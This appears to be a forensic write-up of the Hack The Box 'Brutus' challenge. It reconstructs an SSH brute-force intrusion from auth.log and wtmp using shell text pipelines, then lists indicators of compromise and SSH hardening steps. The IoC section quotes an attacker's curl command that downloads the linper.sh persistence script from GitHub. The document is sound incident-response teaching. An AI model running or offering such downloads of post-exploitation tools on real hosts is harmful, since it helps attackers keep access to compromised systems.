# HTB: Brutus - Forensic Analysis Writeup

![HTB Brutus](https://labs.hackthebox.com/storage/challenges/b7bb35b9c6ca2aee2df08cf09d7016c2.png)

## Overview

This writeup details the forensic investigation performed on the Hack The Box challenge **Brutus**. The analysis focuses on SSH authentication events, brute-force login activity, and post-compromise attacker behavior by reviewing `auth.log` and `wtmp` files extracted from a compromised Linux host.

---

## Box Information

| Attribute     | Value                  |
|---------------|------------------------|
| **Name**      | Brutus                 |
| **OS**        | Linux                  |
| **Category**  | Forensics / Incident Response |
| **Difficulty**| Medium                 |
| **Release**   | 2024                   |
| **Author**    | HTB Team               |

---

## Collected Evidence

The following log files were provided for analysis:

- **`auth.log`** – Syslog-format authentication log tracking logins, failures, and related events.
- **`wtmp`** – Binary session log that records user logins and logouts.

Both files were acquired from the target system post-compromise.

---

## Tools Used

- Command-line text utilities: `cut`, `grep`, `sort`, `uniq`, `rev`
- `last` – for parsing and viewing `wtmp`
- `head`, `less` – for manual log inspection

---

## Timeline of Events

| Date & Time         | Event Description                                      |
|---------------------|-------------------------------------------------------|
| Mar 6, 06:18:01     | CRON job executed by `confluence`                     |
| Mar 6, 06:19:54     | Successful root SSH login from `203.101.190.9`        |
| Mar 6, 06:31:33-42  | Burst of failed SSH logins; brute-force activity      |
| Mar 6, 06:31:40     | Successful root SSH login from `65.2.161.68`          |
| Mar 6, 06:32:44     | Successful root SSH login from `65.2.161.68`          |
| Mar 6, 06:37:34     | Successful `cyberjunkie` SSH login from `65.2.161.68` |

---

## Analysis

### Log File Time Discrepancies

- `auth.log` records the initiation of SSH authentication attempts.
- `wtmp` logs the beginning of user sessions (only after successful authentication).
- This explains the observed 1-second differences in the same event between the two logs.

---

### Log Activity Summary

**Top Programs by Log Activity:**
```bash
cat auth.log | cut -d' ' -f 6 | cut -d '[' -f 1 | sort | uniq -c | sort -nr
```
```
257 sshd
104 CRON
  8 systemd-logind
  6 sudo:
  3 groupadd
  2 usermod
  2 systemd:
  1 useradd
  1 passwd
  1 chfn
```
- High SSH activity suggests systematic brute-force attempts.
- User management commands indicate new accounts or privilege escalation steps.

---

### Brute-Force SSH Attempts

**Failed Logins:**
```bash
cat auth.log | grep Failed | cut -d: -f4 | cut -d' ' -f5- | rev | cut -d' ' -f6- | rev | sort | uniq -c | sort -nr
```
```
12 invalid user server_adm
11 invalid user svc_account
10 invalid user admin
 9 backup
 6 root
```
- The high concentration of attempts on different usernames within seconds confirms automated brute-force tools were used.

---

### Successful SSH Logins

**Accepted Passwords:**
```bash
cat auth.log | grep "Accepted password"
```
```
Mar  6 06:19:54 - root login from 203.101.190.9
Mar  6 06:31:40 - root login from 65.2.161.68
Mar  6 06:32:44 - root login from 65.2.161.68
Mar  6 06:37:34 - cyberjunkie login from 65.2.161.68
```
- The attacker succeeded in logging in as `root` and later as `cyberjunkie` from `65.2.161.68`, immediately after the brute-force burst.

---

### Indicators of Compromise (IoCs)

- **Malicious IP Address:** `65.2.161.68` (primary attack source)
- **Compromised Accounts:** `root`, `cyberjunkie`
- **Attack Vector:** SSH brute-force followed by successful password authentication
- **Suspicious Activity:** Downloaded and executed `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` (potential post-exploitation script)

---

## Observations

- **Automation:** The attacker used scripts or tools to automate SSH login attempts for common usernames.
- **Persistence:** Creation/use of a secondary user (`cyberjunkie`) for persistent access.
- **Post-exploitation:** The use of `linper.sh` suggests attempts at privilege escalation or enumeration.

---

## Recommendations

- **Disable direct SSH login for root**:
    ```
    PermitRootLogin no
    ```
- **Enforce key-based SSH authentication**:
    ```
    PasswordAuthentication no
    ```
- **Limit authentication attempts**:
    ```
    MaxAuthTries 3
    ```
- **Deploy fail2ban or similar** to block brute-force attempts.
- **Rotate all passwords** for affected or exposed accounts.
- **Audit for persistence**: Review for new/unknown user accounts.
- **Perform full forensic imaging** of memory and disk for deeper investigation.

---

## Conclusion

The investigation confirms a brute-force SSH attack from `65.2.161.68` led to compromise of the `root` and `cyberjunkie` accounts. The attacker established persistence and ran post-exploitation scripts due to insufficient SSH hardening. Implementation of best practices for SSH security and intrusion prevention is strongly recommended to prevent future incidents.

---

**Author:** 0xdf-sec  
**Date:** June 2, 2025  
**Tags:** `hackthebox` `forensics` `incident-response` `ssh` `bruteforce` `linux`
